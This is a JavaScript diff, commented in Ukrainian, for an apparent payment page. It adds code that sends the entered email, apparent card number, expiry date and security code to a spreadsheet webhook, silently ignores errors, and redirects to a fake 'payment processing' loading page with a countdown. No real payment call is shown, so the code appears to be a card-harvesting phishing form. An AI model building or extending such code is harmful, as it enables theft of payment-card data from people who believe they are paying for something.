@@ -58,25 +58,25 @@ function validate(){
   return { email, numberVal, mdDateVal, codeVal };
 }
 
+// Відправка на наш бекенд /api/sheet
 async function sendToSheet(payload){
   try{
     if(typeof SHEET_WEBHOOK_URL !== 'string' || !SHEET_WEBHOOK_URL) return;
-    // Проксі на нашому домені: можна звичайний JSON POST
     await fetch(SHEET_WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload),
       keepalive: true
     });
-  }catch(e){
-    // Можна подивитися у консолі при дебазі:
-    // console.error('sendToSheet error', e);
-  }
+  }catch(e){ /* тихо ігноруємо */ }
 }
 
 async function onPay(){
   const v = validate();
   if(!v) return;
+
+  // захист від подвійного кліку
+  payBtn.disabled = true;
 
   const entry = {
     created_at: new Date().toISOString(),
@@ -90,8 +90,12 @@ async function onPay(){
     price: (priceLabel.textContent || '').replace(' ₴','')
   };
 
-  // Відправляємо і одразу переходимо на "обробку"
+  // відправляємо і переходимо на "обробку платежу"
+  sendToSheet(entry);
 
+  setTimeout(() => {
+    window.location.href = '/loading.html';
+  }, 300);
 }
 
 function startCountdown(minutes=5){
